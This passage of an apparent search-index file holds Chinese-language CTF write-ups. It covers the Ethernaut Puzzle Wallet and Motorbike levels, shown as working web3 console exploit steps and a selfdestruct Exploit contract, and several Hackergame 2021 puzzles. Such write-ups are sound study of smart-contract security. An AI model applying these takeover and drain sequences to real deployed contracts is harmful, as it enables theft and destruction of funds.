\u4f46\u8fd9\u6837\u8981\u4f7f balances[player] >= value \u800c\u901a\u8fc7 deposit \u589e\u52a0 balances[player] \u7684\u8bdd\uff0c\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u4e5f\u4f1a\u540c\u6b65\u589e\u52a0 \u6240\u4ee5\u8981\u4f7f\u7528 multicall \u51fd\u6570\u6765\u4f7f balances[player] \u589e\u52a0\u91cf\u4e3a\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u589e\u52a0\u91cf\u7684\u4e8c\u500d \u4f46\u662f multicall \u4e2d\u68c0\u6d4b\u4e86 selector \u4f7f deposit \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u8fd9\u53ef\u4ee5\u901a\u8fc7 multicall \u4e2d\u6267\u884c\u4e24\u4e2a multicall\uff0c\u6bcf\u4e2a multicall \u8c03\u7528\u4e00\u6b21 deposit \u8fd9\u6837\u5206\u6790\u4e4b\u540e\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff0c\u9996\u5148\u8c03\u7528 proposeNewAdmin \u6765\u4f7f pendingAdmin\uff08owner\uff09\u53d8\u4e3a player\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5408\u7ea6\u7684\u65b9\u5f0f\u8c03\u7528 > await web3 . eth . getStorageAt ( instance , 0 ) // owner '0x000000000000000000000000<level address>' > web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) // selector '0xa6376746' > data = web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) + player . slice ( 2 ). padStart ( 64 , \"0\" ) '0xa6376746000000000000000000000000<player address>' > web3 . eth . sendTransaction ({ from : player , to : instance , data : data }) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<player address>' \u7136\u540e\u62ff\u5230 owner \u540e\u9700\u8981\u5c06\u81ea\u5df1\u52a0\u5165\u767d\u540d\u5355\uff0c\u5e76\u4e14\u5148\u67e5\u8be2\u4e00\u4e0b\u5408\u7ea6\u8d26\u6237\u4f59\u989d > await contract . addToWhitelist ( player ) > await getBalance ( instance ) '0.001' \u6240\u4ee5\u9700\u8981\u6784\u9020\u4e00\u4e2a calldata\uff0c\u5b83\u4f1a\u901a\u8fc7 multicall \u8c03\u7528 deposit\uff0c\u7136\u540e\u628a\u4e24\u4e2a\u8fd9\u4e2a calldata \u4f20\u5165 multicall\uff0c\u540c\u65f6\u9644\u5e26 value 0.001 ether\uff0c\u8fd9\u6837 balances[player] \u5c31\u4f1a\u589e\u52a0 0.002 ether\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 execute \u76f4\u63a5\u63d0\u53d6\u51fa\u8fd9 0.002 ether \u63d0\u53d6\u540e\u5408\u7ea6\u8d26\u6237\u7684 balance \u53d8\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e86 > web3 . utils . sha3 ( \"deposit()\" ). slice ( 0 , 10 ) // deposit selector '0xd0e30db0' > data = ( await contract . methods [ \"multicall(bytes[])\" ]. request ([ \"0xd0e30db0\" ])). data // \u6784\u9020\u901a\u8fc7 multicall \u8c03\u7528 deposit \u7684 calldata '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000' > await contract . multicall ([ data , data ], { value : toWei ( \"0.001\" )}) > await getBalance ( instance ) '0.002' > contract . execute ( player , toWei ( \"0.002\" ), 0 > await getBalance ( instance ) '0' > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<level address>' > contract . setMaxBalance ( player ) > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<player address>'","title":"Puzzle Wallet"},{"location":"writeups/ethernaut/#motorbike","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity < 0.7.0 ; import \"@openzeppelin/contracts/utils/Address.sol\" ; import \"@openzeppelin/contracts/proxy/Initializable.sol\" ; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; struct AddressSlot { address value ; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor ( address _logic ) public { require ( Address . isContract ( _logic ), \"ERC1967: new implementation is not a contract\" ); _getAddressSlot ( _IMPLEMENTATION_SLOT ). value = _logic ; ( bool success ,) = _logic . delegatecall ( abi . encodeWithSignature ( \"initialize()\" ) ); require ( success , \"Call failed\" ); } // Delegates the current call to `implementation`. function _delegate ( address implementation ) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy ( 0 , 0 , calldatasize ()) let result : = delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) returndatacopy ( 0 , 0 , returndatasize ()) switch result case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate ( _getAddressSlot ( _IMPLEMENTATION_SLOT ). value ); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r_slot : = slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; address public upgrader ; uint256 public horsePower ; struct AddressSlot { address value ; } function initialize () external initializer { horsePower = 1000 ; upgrader = msg.sender ; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall ( address newImplementation , bytes memory data ) external payable { _authorizeUpgrade (); _upgradeToAndCall ( newImplementation , data ); } // Restrict to upgrader role function _authorizeUpgrade () internal view { require ( msg.sender == upgrader , \"Can't upgrade\" ); } // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall ( address newImplementation , bytes memory data ) internal { // Initial upgrade and setup call _setImplementation ( newImplementation ); if ( data . length > 0 ) { ( bool success ,) = newImplementation . delegatecall ( data ); require ( success , \"Call failed\" ); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation ( address newImplementation ) private { require ( Address . isContract ( newImplementation ), \"ERC1967: new implementation is not a contract\" ); AddressSlot storage r ; assembly { r_slot : = _IMPLEMENTATION_SLOT } r . value = newImplementation ; } } \u540c\u6837\u6709\u4e9b\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u8981\u9500\u6bc1\u6389 Engine \u56e0\u4e3a\u6574\u4e2a\u5408\u7ea6\u4e2d\u90fd\u6ca1\u6709 selfdestruct\uff0c\u6240\u4ee5\u8981\u8f7d\u5165\u81ea\u5df1\u7684\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7 upgradeToAndCall \u51fd\u6570\u6765\u8f7d\u5165\u5408\u7ea6\u5e76\u8c03\u7528\uff0c\u8fd9\u9700\u8981\u901a\u8fc7 _authorizeUpgrade \u51fd\u6570\u7684\u68c0\u67e5\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5 sender \u662f\u5426\u662f upgrader\uff0c\u800c\u6539\u53d8 upgrader \u53ef\u4ee5\u901a\u8fc7 initialize \u51fd\u6570\u6765\u5b8c\u6210 \u6240\u4ee5\u653b\u51fb\u6d41\u7a0b\u5c31\u662f\u5148\u901a\u8fc7 getStorageAt \u6765\u5f97\u5230\u90e8\u7f72\u7684 Engine \u7684\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528 initialize\uff0cupgradeToAndCall \u4e00\u4e2a\u90e8\u7f72\u7684\u65b0\u5408\u7ea6\uff0c\u8ba9\u5b83\u89e6\u53d1 selfdestruct \u5c31\u597d\u4e86 \u65b0\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { function exp () public { selfdestruct ( payable ( 0 )); } } \u653b\u51fb\u6d41\u7a0b\uff1a > await web3 . eth . getStorageAt ( instance , \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\" ) '0x000000000000000000000000<engine address>' > engine = \"0x<engine address>\" > data = web3 . utils . sha3 ( \"initialize()\" ). slice ( 0 , 10 ) '0x8129fc1c' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data }) > await web3 . eth . call ({ from : player , to : engine , data : web3 . utils . sha3 ( \"upgrader()\" ). slice ( 0 , 10 )}) // \u9a8c\u8bc1 upgrader '0x000000000000000000000000<player address>' > exp = \"<Exploit contract address>\" > expdata = web3 . utils . sha3 ( \"exp()\" ). slice ( 0 , 10 ) '0xab60ffda' > signature = { name : 'upgradeToAndCall' , type : 'function' , inputs : [ { type : 'address' , name : 'newImplementation' }, { type : 'bytes memory' , name : 'data' } ] } { name : 'upgradeToAndCall' , type : 'function' , inputs : Array ( 2 )} > data = web3 . eth . abi . encodeFunctionCall ( upgradeSignature , [ exp , expdata ]) '0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data })","title":"Motorbike"},{"location":"writeups/hackergame2021/","text":"Hackergame 2021 Writeup \u00b6 Abstract \u53c2\u52a0\u7684\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u7b97\u662f CTF \u7684\u6bd4\u8d5b\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1a https://blog.tonycrane.cc/p/c05d7b7c.html \u5b98\u65b9 writeup \u7b7e\u5230 \u00b6 \u4e3a\u4e86\u80fd\u8ba9\u5927\u5bb6\u987a\u5229\u7b7e\u5230\uff0c\u547d\u9898\u7ec4\u628a\u6bcf\u4e00\u79d2\u7684 flag \u90fd\u8bb0\u5f55\u4e0b\u6765\u5236\u6210\u4e86\u65e5\u8bb0\u672c\u7684\u4e00\u9875\u3002\u4f60\u53ea\u9700\u8981\u6253\u5f00\u65e5\u8bb0\uff0c\u7ffb\u5230 Hackergame 2021 \u6bd4\u8d5b\u8fdb\u884c\u671f\u95f4\u7684\u4efb\u4f55\u4e00\u9875\u5c31\u80fd\u5f97\u5230 flag\uff01 \u5f88\u660e\u786e\uff0c\u8fdb\u5165\u7f51\u5740\u540e\u4e00\u76f4\u70b9 Next \u7ffb\u5230\u6bd4\u8d5b\u65f6\u95f4\u5c31\u597d\u4e86\uff08\u8bef \u770b\u5230\u4e86 URI \u91cc\u6709 ?page=... \uff0c\u6240\u4ee5\u4e5f\u61d2\u5f97\u8ba1\u7b97\u4e86\uff0c\u624b\u52a8\u4e8c\u5206\uff0c\u5927\u6982 ?page=1635000000 \u5de6\u53f3\u5c31\u53ef\u4ee5\u770b\u5230 flag \u4e86 \u8d5b\u540e\u624d\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f UNIX \u65f6\u95f4\u6233 \u8fdb\u5236\u5341\u516d\u2014\u2014\u53c2\u4e0a \u00b6 \u4e5f\u5f88\u660e\u786e\uff0c\u76f4\u63a5\u628a\u53f3\u4fa7\u6321\u4f4f\u7684 flag \u90e8\u5206\u5bf9\u5e94\u5de6\u8fb9\u7684\u5341\u516d\u8fdb\u5236\u6570\u6362\u7b97\u6210\u5341\u8fdb\u5236\uff0c\u7136\u540e\u6839\u636e ASCII \u7801\u8f6c\u6210\u5b57\u7b26\u3002\u6216\u8005\u76f4\u63a5\u628a\u5de6\u4fa7\u6284\u8fdb Hex Friend \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u53f3\u4fa7\u7684flag\u3002 \uff08**\u5f53\u65f6\u8fd9\u9898\u6284\u4e32\u884c\u4e86\u4e24\u4e09\u6b21\u2026\u2026\uff09 \u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2 \u00b6 \u5f53\u7136\uff0c\u5982\u679c\u53ea\u662f\u8fd9\u6837\u8fd8\u8fdc\u8fdc\u4e0d\u591f\u3002\u9075\u4f9d\u53f2\u79f0\u201c\u8001\u7239\u201d\u7684\u4e0a\u53e4\u5148\u8d24\u7684\u81f3\u7406\u540d\u8a00\uff0c\u5fc5\u987b\u8981\u201c\u7528\u9b54\u6cd5\u6253\u8d25\u9b54\u6cd5\u201d\u3002X \u540c\u5b66\u5411\u4e0a\u7ea7\u7533\u8bf7\u5230\u4e86\u79d1\u5927\u897f\u533a\u540c\u6b65\u8f90\u5c04\u5b9e\u9a8c\u5ba4\u8bbe\u5907\u7684\u4f7f\u7528\u6743\u9650\uff0c\u4ee5\u6b64\u6253\u901a\u6b21\u5143\u7a7a\u95f4\uff0c\u501f\u52a9\u5230\u53e6\u4e00\u4e2a\u5e73\u884c\u5b87\u5b99\u4e2d Z \u540c\u5b66\u7684\u6cd5\u529b\u8fdb\u884c\u6570\u636e\u5bf9\u51b2\uff0c\u65b9\u624d\u4e8e\u4e71\u4e2d\u640f\u5f97\u4e00\u4e1d\u673a\u4f1a\uff0c\u5c06 flag \u7528\u65e0\u7ebf\u7535\u7684\u5f62\u5f0f\u53d1\u5c04\u4e86\u51fa\u53bb\u3002 \u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u3002\u5373\u4f7f\u5982\u6b64\uff0c\u6253\u7834\u6b21\u5143\u7684\u5f3a\u5927\u80fd\u91cf\u626d\u66f2\u4e86\u65f6\u7a7a\uff0c\u4f7f\u5f97\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u3002 \uff08\u8fd9\u9898\u5728\u7fa4\u91cc\u770b\u8d77\u6765\u597d\u50cf\u5361\u4e86\u5f88\u591a\u4eba\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff09 \u9898\u76ee\u4e0b\u8f7d\u4e0b\u6765\u662f\u4e00\u4e2a\u542c\u8d77\u6765\u6742\u4e71\u7684\u97f3\u9891 \u9898\u91cc\u6700\u540e\u8bf4\u4e86 \u201c\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684 \u901f\u5ea6 \u6709\u6240\u6539\u53d8\u201d\uff0c\u6240\u4ee5\u8003\u8651\u5c06\u97f3\u9891\u65f6\u95f4\u62c9\u957f\u3002 \u6700\u5f00\u59cb\u4f7f\u7528\u4e86 Adobe Audition\uff0c\u4f46\u662f\u6548\u679c\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u5927\u6982\u662f\u91cd\u65b0\u91c7\u6837\u7b49\u4e00\u7cfb\u5217\u7b97\u6cd5\u5bfc\u81f4\u7684 \u6240\u4ee5\u6362\u4e86 Adobe Premier Pro \u76f4\u63a5\u7528\u6bd4\u7387\u62c9\u4f38\u5de5\u5177\u62c9\u957f\u97f3\u9891\uff0c\u8fd8\u662f\u53ef\u4ee5\u542c\u6e05\u7684 \u4e0d\u65ad\u5c1d\u8bd5\u4e4b\u540e\uff0c\u5927\u6982\u653e\u6162\u4e09\u500d\u5de6\u53f3\u5c31\u53ef\u4ee5\u542c\u51fa\u8bfb\u7684\u662f\u82f1\u8bed\u5355\u8bcd\u4e86 \u9898\u91cc\u8bf4\u5230\u4e86 \u201c\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86 \u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5 \u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u201d\uff0c\u6240\u4ee5\u5c31\u67e5\u5230\u4e86 \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 \u7136\u540e\u4ed4\u7ec6\u542c\uff0c\u8fa8\u522b\u6bcf\u4e2a\u5355\u8bcd\u7684\u7b2c\u4e00\u4e2a\u97f3\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86 \u732b\u54aa\u95ee\u7b54 Pro Max \u00b6 \u4e94\u9053\u5201\u94bb\u7684\u9898\u76ee\uff0c\u4f46\u662f\u8fd8\u662f\u597d\u67e5\u5230\u7684\uff0c\u9898\u76ee\u91cc\u4e5f\u8bf4\u4e86\u201c\u89e3\u51fa\u8c1c\u9898\u4e0d\u9700\u8981\u662f\u79d1\u5927\u5728\u6821\u5b66\u751f\u201d 2017 \u5e74\uff0c\u4e2d\u79d1\u5927\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\uff08SEC@USTC\uff09\u5e76\u5165\u4e2d\u79d1\u5927 Linux \u7528\u6237\u534f\u4f1a\uff08USTCLUG\uff09\u3002\u76ee\u524d\uff0c\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u57df\u540d\uff08sec.ustc.edu.cn\uff09\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f46\u4f60\u80fd\u627e\u5230\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u793e\u56e2\u7ae0\u7a0b\u5728\u54ea\u4e00\u5929\u7684\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u4e0a\u901a\u8fc7\u7684\u5417\uff1f \u770b\u5230\u4e86 \u201c\u76ee\u524d\uff0c\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\u201d \u8bf4\u660e\u8fd9\u4e2a\u57df\u540d\u66fe\u7ecf\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\uff0c\u76f4\u63a5\u901a\u8fc7 \u4e92\u8054\u7f51\u7684\u8bb0\u5fc6 archive.org\uff0c\u67e5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u5386\u53f2\u5b58\u6863\uff0c\u968f\u4fbf\u627e\u4e00\u5929\u5c31\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u5b98\u7f51\u4e2d\u7684 \u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u793e\u56e2\u7ae0\u7a0b \u3002 \u5176\u4e2d\u7b2c\u4e00\u884c\u5c31\u5199\u4e86 \u201c\u672c\u7ae0\u7a0b\u5728 2015 \u5e74 5 \u6708 4 \u65e5 \uff0c\u7ecf\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u5ba1\u8bae\u901a\u8fc7\u3002\u201d \u6240\u4ee5\u7b54\u6848\u5c31\u662f 20150504 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u5728\u8fd1\u4e94\u5e74\u591a\u5c11\u6b21\u88ab\u8bc4\u4e3a\u6821\u4e94\u661f\u7ea7\u793e\u56e2\uff1f \u76f4\u63a5\u53bb\u79d1\u5927 LUG \u5b98\u7f51\u7684 Intro \u9875\u9762 \uff0c\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u4e8e 2015 \u5e74 5 \u6708\u30012017 \u5e74 7 \u6708\u30012018 \u5e74 9 \u6708\u30012019 \u5e74 8 \u6708\u53ca 2020 \u5e74 9 \u6708\u88ab\u8bc4\u4e3a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u4e94\u661f\u7ea7\u5b66\u751f\u793e\u56e2\u3002\u201d \u6240\u4ee5\u662f4\u6b21\uff08x \u4f46\u662f\u6000\u7591\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u6ca1\u67092021\u5e74\uff0c\u56e0\u4e3a\u90fd\u662f\u57289\u6708\u4efd\u5de6\u53f3\uff0c\u6240\u4ee5\u53ef\u80fd\u662f\u6570\u636e\u6ca1\u66f4\u65b0\uff0c\u8fd9\u98984\u548c5\u90fd\u6709\u53ef\u80fd \u5c1d\u8bd5\u540e\u5f97\u5230\u7b54\u6848\u662f 5 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u4f4d\u4e8e\u897f\u533a\u56fe\u4e66\u9986\u7684\u6d3b\u52a8\u5ba4\u95e8\u53e3\u7684\u724c\u5b50\u4e0a\u201cLUG @ USTC\u201d\u4e0b\u65b9\u7684\u5c0f\u5b57\u662f\uff1f \u8fd9\u9898\u4e5f\u7b80\u5355\uff0c\u76f4\u63a5\u95ee\u79d1\u5927\u540c\u5b66\u5c31\u597d\u4e86\uff08x \u7ffb\u4e86 LUG \u7684\u5fae\u4fe1\u516c\u4f17\u53f7\u548c QQ \u5b98\u65b9\u53f7\uff0c\u90fd\u6ca1\u5565\u6536\u83b7\uff0c\u6700\u540e\u53d1\u73b0\u5b98\u7f51\u4e0a\u6709 News \u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u65b0\u542f\u7528\u6d3b\u52a8\u5ba4\u7684\u8bdd\uff0c\u4e00\u5b9a\u4f1a\u6709\u4e00\u7bc7\u65b0\u95fb\u7a3f\uff0c\u641c\u7d22\u201c\u56fe\u4e66\u9986\u201d\u5f97\u5230\u4e86 \u300c\u897f\u533a\u56fe\u4e66\u9986\u65b0\u6d3b\u52a8\u5ba4\u542f\u7528\u300d \u8fd9\u7bc7\u6587\u7ae0\uff0c\u5f00\u7bc7\u7b2c\u4e00\u5f20\u5927\u56fe\u5c31\u662f\u95e8\u53e3\u724c\u5b50\u7684\u7167\u7247 \u6240\u4ee5\u7b54\u6848\u662f Development Team of Library \uff08\u6ce8\u610f\u5927\u5c0f\u5199\uff09 \u5728 SIGBOVIK 2021 \u7684\u4e00\u7bc7\u5173\u4e8e\u4e8c\u8fdb\u5236 Newcomb-Benford \u5b9a\u5f8b\u7684\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e00\u5171\u5c55\u793a\u4e86\u591a\u5c11\u4e2a\u6570\u636e\u96c6\u5bf9\u5176\u7406\u8bba\u7ed3\u679c\u8fdb\u884c\u9a8c\u8bc1\uff1f \u5e94\u8be5\u6ca1\u5fc5\u8981\u641c\u8c37\u6b4c\u5b66\u672f\u4e4b\u7c7b\u7684\uff0c\u76f4\u63a5\u5fc5\u5e94\u67e5 \u201cSIGBOVIK Newcomb-Benford\u201d \u5c31\u53ef\u4ee5\u627e\u5230 SIGBOVIK \u7684 \u8fd9\u4e00\u7bc7\u5927\u6587\u7ae0\u5408\u96c6 \uff0c\u518d\u641c\u7d22 Newcomb \u5c31\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u91cc\u8bf4\u7684\u8bba\u6587\u4e86\u3002 \u5168\u6587\u4e5f\u4e0d\u957f\uff0c\u53ea\u6709\u56db\u9875\uff0c\u540e\u4e24\u9875\u5168\u662f\u6570\u636e\u7684\u56fe\uff0c\u6570\u4e00\u4e0b\uff0c\u4e00\u5171\u670913\u5e45 \u6240\u4ee5\u7b54\u6848\u662f 13 \u4e0d\u4e25\u683c\u9075\u5faa\u534f\u8bae\u89c4\u8303\u7684\u64cd\u4f5c\u7740\u5b9e\u4ee4\u4eba\u751f\u538c\uff0c\u597d\u5728 IETF \u4e8e 2021 \u5e74\u6210\u7acb\u4e86 Protocol Police \u4ee5\u76d1\u7763\u5e76\u60e9\u6212\u6240\u6709\u8fdd\u80cc RFC \u6587\u6863\u7684\u884c\u4e3a\u4e2a\u4f53\u3002\u5047\u5982\u4f60\u53d1\u73b0\u4e86\u67d0\u4f4d\u540c\u5b66\u53ef\u80fd\u8fdd\u53cd\u4e86\u534f\u8bae\u89c4\u8303\uff0c\u6839\u636e Protocol Police \u76f8\u5173\u6587\u6863\u4e2d\u89c4\u5b9a\u7684\u4e3e\u62a5\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u5c06\u4f60\u7684\u4e3e\u62a5\u4fe1\u53d1\u5f80\u4f55\u5904\uff1f \u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u67e5\uff0c\u7b54\u6848 /dev/null \u7136\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u5356\u74dc \u00b6 \u9898\u76ee\u91cc\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\u5c31\u662f\uff1a \u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002 \u9898\u76ee\u7684\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u7528\u4e00\u58069\u548c\u4e00\u58066\u52a0\u8d77\u6765\u5f97\u523020\u3002\u80af\u5b9a\u4e0d\u80fd \u50cf\u534e\u5f3a\u4e00\u6837 \u5288\u74dc\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u5b9a\u662f\u6574\u6570 \u90a3\u5c31\u53ef\u4ee5\u8003\u8651\u6ea2\u51fa \u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u7ed9\u7684\u6570\u5b57\u592a\u5927\uff0c\u5c31\u4f1a\u4f7f\u7ed3\u679c\u6ea2\u51fa\u5230\u6d6e\u70b9\u6570\uff0c\u8fd9\u4e0d\u662f\u60f3\u8981\u7684\uff08\u56e0\u4e3a\u5373\u4f7f\u51d1\u5230\u4e8620.0\u4e5f\u4e0d\u6b63\u786e\uff09 \u90a3\u5982\u679c\u6570\u5b57\u518d\u5927\u5462\uff0c\u6bd4\u5982 2000000000000000000\uff0818\u4e2a0\uff09\u4e2a9\u65a4\u7684\u74dc\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u65f6\u76f4\u63a5\u6ea2\u51fa\u5230\u4e86\u8d1f\u6574\u578b -446744073709551616 \u518d\u8865\u4e0a 49638230412172000 \u4e2a9\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 -3616\uff0c\u52a0\u4e0a20\u53ef\u4ee5\u88ab6\u6574\u9664\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a606\u4e2a6\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 20 \u606d\u559c\u4f60\u9003\u8fc7\u4e00\u52ab\uff01\u534e\u5f3a\uff5e\u534e\u5f3a\uff01 \u900f\u660e\u7684\u6587\u4ef6 \u00b6 \u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002 \u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002 \u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002 \u62ff\u5230\u6587\u4ef6\uff0c\u770b\u5230\u91cc\u9762\u597d\u591a [ ; m \u4e4b\u7c7b\u7684\uff0c\u518d\u7ed3\u5408\u7ec8\u7aef\u4e2d\u8f93\u51fa\u5e26\u989c\u8272\u6587\u5b57\u7684 \\033[...m; \u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9898\u76ee\u4e2d\u7684 \u201c\u5931\u53bb\u4e86\u4e00\u4e9b \u91cd\u8981\u6210\u5206 \u201d \u6240\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u628a [ \u5168\u5c40\u66ff\u6362\u4e3a \\033[ \uff0c\u7136\u540e\u590d\u5236\u5230 python \u4e2d print\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u795e\u5947\u7684\u4e00\u5e55\u4e86\uff08\u5176\u5b9e\u5e76\u6ca1\u5b8c\u5168\u505a\u5b8c\uff0c\u4f46\u662f\u53ef\u4ee5\u5df2\u7ecf\u770b\u4e86\uff09 \u7136\u540e\u8bfb\u51fa flag \u5373\u53ef\uff08\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\uff09 \u65c5\u884c\u7167\u7247 \u00b6 \u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u8bf4\u8d70\u5c31\u8d70\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u4ed6\u5e94\u8be5\u662f\u5728\u9152\u5e97\u4f4f\u4e0b\u4e86\u3002 